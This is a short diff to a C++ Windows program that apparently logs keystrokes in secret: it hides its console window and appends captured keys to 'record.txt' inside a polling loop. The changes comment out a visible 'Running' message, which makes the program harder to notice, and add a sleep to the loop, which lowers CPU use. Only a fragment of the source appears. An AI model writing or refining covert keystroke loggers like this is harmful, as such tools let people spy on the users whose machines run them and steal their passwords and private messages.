@@ -336,7 +336,7 @@ void alphabetKey(fstream &file, int key, bool capital){
 int main(){
     ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
 
-    cout << "Running" << endl;
+    // cout << "Running" << endl;
 
     // Create and open file at the start
     fstream myFile("record.txt", ios::app);
@@ -392,5 +392,6 @@ int main(){
                 myFile.flush();
             }
         }
+        Sleep(10);
     }
 }
